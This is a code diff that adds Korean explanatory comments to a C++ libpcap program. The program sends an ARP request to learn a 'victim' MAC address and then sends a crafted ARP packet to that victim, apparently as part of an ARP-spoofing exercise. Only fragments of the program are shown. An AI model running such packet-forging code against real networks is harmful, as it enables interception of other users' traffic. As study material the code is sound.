@@ -87,16 +87,18 @@ int main(int argc, char* argv[]) {
 	packet.arp_.pln_ = Ip::SIZE;
 
 	packet.arp_.smac_ = Mac(src_mac);
-	packet.arp_.sip_ = htonl(Ip(ipAddress));
+	packet.arp_.sip_ = htonl(Ip(ipAddress)); // 나 
 
 	packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
-	packet.arp_.tip_ = htonl(Ip(argv[2]));
+	packet.arp_.tip_ = htonl(Ip(argv[2])); // 
 
 
 	
 
 	//========================== replay packet을 보내고 vicitm의 mac 주소를 얻어내는 것 
-
+	// handle을 통해 packet 전송 
+	// pcap 라이브러리를 사용하여 네트워크 인터페이스를 통해 패킷을 송신하는 데 사용 
+	// 이 함수는 송신할 패킷을 지정하는 버퍼와 버퍼의 길이를 인수로 받는다. 
 	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
 
 	if (res != 0) {
@@ -110,6 +112,8 @@ int main(int argc, char* argv[]) {
     while (true) {
         struct pcap_pkthdr* header;
         const u_char* reply_packet;
+		// reply_packet에 packet 캡쳐 된게 저장 
+		// pcap 라이브러리를 사용하여 데이터 링크 계층에서 하나의 패킷을 캡쳐하는 데 사용 
         int result = pcap_next_ex(handle, &header, &reply_packet);
         if (result == 0) {
             continue;
@@ -117,10 +121,12 @@ int main(int argc, char* argv[]) {
         if (result == -1 || result == -2) {
             break;
         }
+		// reply_packet -> pArpPacket으로 변환 
 
         EthArpPacket* pArpPacket = reinterpret_cast<EthArpPacket*>(const_cast<u_char*>(reply_packet));
 
         // ARP reply 패킷인지 확인 및 target IP 확인
+		// 
         if (ntohs(pArpPacket->eth_.type_) == EthHdr::Arp &&
             ntohs(pArpPacket->arp_.op_) == ArpHdr::Reply &&
             pArpPacket->arp_.tip_ == packet.arp_.sip_ &&
@@ -158,7 +164,7 @@ int main(int argc, char* argv[]) {
 	packet.arp_.tmac_ = Mac(dst_mac);
 	packet.arp_.tip_ = htonl(Ip(argv[2]));
 
-
+	// packet을 전송 ( handle)
 	int ras = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
 		
 	if (ras != 0) {
